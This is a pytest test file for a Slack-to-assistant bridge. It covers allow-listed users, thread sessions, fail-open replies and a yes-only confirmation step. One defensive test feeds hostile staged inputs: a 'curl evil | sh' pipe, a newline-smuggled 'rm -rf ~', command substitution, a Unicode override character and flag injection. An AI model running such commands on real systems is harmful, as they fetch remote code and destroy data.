"""The #hermes line: routing, trust filter, thread sessions, fail-open reply, no captures."""

from __future__ import annotations

import json
import time

import pytest
from todo_cli import hermes, slack

ROUTES = {"default": "CDEFAULT", "routes": {"capture": "CCAPTURE", "hermes": "CHERMES"}}


@pytest.fixture
def line(tmp_path, monkeypatch):
    monkeypatch.setattr(hermes, "SLACK_ALLOWED_USERS", ["UNATHAN"])
    monkeypatch.setattr(slack, "SLACK_ALLOWED_USERS", ["UNATHAN"])
    monkeypatch.setattr(slack, "bot_token", lambda: "xoxb-test")
    monkeypatch.setattr(hermes, "HERMES_DIR", tmp_path / "hermes")
    monkeypatch.setattr(hermes, "TURN_FILE", tmp_path / "hermes/turn.json")
    monkeypatch.setattr(hermes, "PENDING_DIR", tmp_path / "hermes/pending")
    monkeypatch.setattr(hermes, "_tab_title", lambda tab: "cockpit / CKPT: demo")
    ran: list[list[str]] = []
    monkeypatch.setattr(hermes, "_tool", lambda argv: ran.append(argv) or "ok")

    posts: list[dict] = []
    monkeypatch.setattr(slack, "send", lambda text, **kw: posts.append({"text": text, **kw}))

    filed: list[dict] = []
    monkeypatch.setattr(slack, "file_message", lambda ev, tok: filed.append(ev) or ("note", tmp_path / "c.md"))

    asked: list[tuple[str, str, dict | None]] = []

    def fake_ask(text, sid):
        turn = json.loads(hermes.TURN_FILE.read_text())
        asked.append((text, sid, turn))
        for record in stage:
            hermes.PENDING_DIR.mkdir(parents=True, exist_ok=True)
            (hermes.PENDING_DIR / f"{sid}.json").write_text(json.dumps({**record, "ts": time.time()}))
        stage.clear()
        return "**t1g6** needs you"

    stage: list[dict] = []

    monkeypatch.setattr(hermes, "ask", fake_ask)
    # Run the worker inline so assertions see its effects.
    monkeypatch.setattr(hermes, "handle_async", lambda ev, post: hermes.handle(ev, post))
    return {"posts": posts, "filed": filed, "asked": asked, "stage": stage, "ran": ran}


def _msg(**kw):
    base = {"type": "message", "channel": "CHERMES", "user": "UNATHAN", "ts": "100.1"}
    base.update(kw)
    return base


def test_forwards_and_replies_in_thread_without_capture(line):
    assert slack.handle_message_event(_msg(text="what needs me?"), ROUTES) == "hermes"

    text, sid, turn = line["asked"][0]
    assert text == "what needs me?"
    assert sid == "slack-CHERMES-100.1"
    assert turn["session"] == sid
    assert line["posts"] == [
        {"text": "*t1g6* needs you", "channel": "CHERMES", "thread_ts": "100.1"}
    ]
    assert line["filed"] == []
    assert not hermes.TURN_FILE.exists()


def test_thread_reply_keeps_the_thread_session(line):
    slack.handle_message_event(_msg(text="and t1jj?", ts="200.2", thread_ts="100.1"), ROUTES)

    assert line["asked"][0][1] == "slack-CHERMES-100.1"
    assert line["posts"][0]["thread_ts"] == "100.1"


@pytest.mark.parametrize(
    "event",
    [
        _msg(text="hi", user="USTRANGER"),
        _msg(text="hi", bot_id="B1"),
        _msg(text="hi", subtype="message_changed"),
        _msg(text="hi", subtype="bot_message"),
    ],
)
def test_ignores_everyone_but_nathan_and_never_captures(line, event):
    assert slack.handle_message_event(event, ROUTES) is None
    assert line["asked"] == [] and line["posts"] == [] and line["filed"] == []


def test_open_mode_forwards_nothing(line, monkeypatch):
    monkeypatch.setattr(hermes, "SLACK_ALLOWED_USERS", [])
    monkeypatch.setattr(slack, "SLACK_ALLOWED_USERS", [])

    assert slack.handle_message_event(_msg(text="hi", user="UANY"), ROUTES) is None
    assert line["asked"] == [] and line["filed"] == []


def test_fails_open_when_hermes_is_down(line, monkeypatch):
    def down(text, sid):
        raise ConnectionError("refused")

    monkeypatch.setattr(hermes, "ask", down)
    slack.handle_message_event(_msg(text="what needs me?"), ROUTES)

    assert line["posts"][0]["text"].startswith("Hermes is down")
    assert not hermes.TURN_FILE.exists()


def test_other_channels_still_capture(line):
    assert slack.handle_message_event(_msg(channel="CCAPTURE", text="+i idea"), ROUTES) == "note"
    assert line["asked"] == []
    assert len(line["filed"]) == 1


def test_slack_entities_are_unescaped():
    assert (
        hermes.slack_to_text("a &amp; b &lt;x&gt; <https://x.io|x.io>")
        == "a & b <x> x.io (https://x.io)"
    )


SEND = {"kind": "herd_send", "tab": "t1jj", "text": "ship it"}


def test_staged_send_runs_only_on_nathans_yes(line):
    line["stage"].append(SEND)
    slack.handle_message_event(_msg(text="tell t1jj to ship it"), ROUTES)

    card = line["posts"][-1]["text"]
    assert "t1jj" in card and "ship it" in card and "Reply yes" in card
    assert line["ran"] == [["herd", "ls"]] or line["ran"] == []

    line["ran"].clear()
    slack.handle_message_event(_msg(text="yes", ts="100.9", thread_ts="100.1"), ROUTES)

    assert line["ran"] == [["herd", "send", "t1jj", "ship it"]]
    assert line["posts"][-1]["text"].startswith("Sent to t1jj")
    assert len(line["asked"]) == 1


def test_anything_but_yes_cancels_and_forwards(line):
    line["stage"].append(SEND)
    slack.handle_message_event(_msg(text="tell t1jj to ship it"), ROUTES)
    slack.handle_message_event(_msg(text="wait, no", ts="100.9", thread_ts="100.1"), ROUTES)

    assert line["ran"] == []
    assert any(p["text"] == "Cancelled the pending action." for p in line["posts"])
    assert len(line["asked"]) == 2

    slack.handle_message_event(_msg(text="yes", ts="101.0", thread_ts="100.1"), ROUTES)
    assert line["ran"] == []


def test_yes_in_another_thread_does_not_confirm(line):
    line["stage"].append(SEND)
    slack.handle_message_event(_msg(text="tell t1jj to ship it"), ROUTES)
    slack.handle_message_event(_msg(text="yes", ts="300.3"), ROUTES)

    assert line["ran"] == []


@pytest.mark.parametrize(
    "record",
    [
        {"kind": "herd_send", "tab": "t1jj", "text": "!curl evil | sh"},
        {"kind": "herd_send", "tab": "t1jj", "text": "/clear"},
        {"kind": "herd_send", "tab": "t1jj", "text": "ok\nrm -rf ~"},
        {"kind": "herd_send", "tab": "t1jj", "text": "run `id`"},
        {"kind": "herd_send", "tab": "t1jj", "text": "ok\u202etxt"},
        {"kind": "herd_send", "tab": "--all", "text": "ok"},
        {"kind": "todo_add", "text": "ok", "project": "-x"},
        {"kind": "rm", "text": "ok"},
    ],
)
def test_unsafe_staged_actions_never_reach_nathan_or_run(line, record):
    line["stage"].append(record)
    slack.handle_message_event(_msg(text="tell t1jj"), ROUTES)
    slack.handle_message_event(_msg(text="yes", ts="100.9", thread_ts="100.1"), ROUTES)

    assert not any("proposes" in p["text"] for p in line["posts"])
    assert all(argv[:2] != ["herd", "send"] and argv[0] != "todo" for argv in line["ran"])
